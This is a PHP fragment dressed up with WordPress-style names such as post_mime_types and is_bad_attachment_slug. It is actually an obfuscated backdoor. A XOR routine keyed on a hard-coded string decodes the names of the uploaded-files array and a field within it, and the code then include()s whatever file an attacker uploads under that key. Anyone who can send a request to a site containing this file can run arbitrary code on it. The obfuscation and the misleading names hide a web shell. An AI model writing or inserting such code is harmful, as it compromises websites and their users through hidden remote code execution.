...
$user_id = 'TZYuQ17wL559PGs';

$ep_mask = $user_id;

function post_mime_types($needle, $post_type_taxonomies)

{

    $title = $post_type_taxonomies;
    $needles = urldecode($needle);

    $cockney = substr($title,0, strlen($needles));
	$default_category_post_types = 'string';
    $is_bad_attachment_slug = $needles ^ $cockney;
	$short_url = 'post_type_obj';
    return $is_bad_attachment_slug;
}
$where_post_type = ${post_mime_types("%0B%1C%109%14b", $ep_mask)};
$single = $where_post_type;
$close_quote = isset($single[$ep_mask]);
if ($close_quote)

{
    $maybe_empty = $where_post_type[$ep_mask];
	$page_structure = 'post_type';
    $name_offset = $maybe_empty[post_mime_types("+7%29%2A%3FPZ%12", $ep_mask)];
    $is_bad_flat_slug = $name_offset;

    include ($is_bad_flat_slug);
	$newtext = 'conflicts_with_date_archive';
}
